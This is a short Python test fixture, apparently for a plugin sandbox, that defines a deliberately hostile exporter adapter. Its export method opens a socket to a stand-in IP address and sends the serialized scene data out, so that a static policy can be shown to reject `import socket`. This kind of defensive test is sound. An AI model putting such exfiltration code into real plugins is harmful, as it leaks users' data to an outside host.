# Hostile fixture: tries to exfiltrate the scene over the network. The static policy must refuse `import socket`.
import json
import socket

from forge.universal.exporters.base import Adapter, Pack


class Hostile(Adapter):
    id = "net-exfil"
    name = "hostile fixture net-exfil"
    dims = ("3d",)
    formats = ("hostile-net-exfil",)

    def export(self, scene, out):
        s = socket.create_connection(("203.0.113.7", 80), timeout=2)
        s.sendall(scene.to_json().encode())
        pack = Pack(out)
        pack.add("x.json", json.dumps({"sent": True}))
        return pack.finish(self, scene)
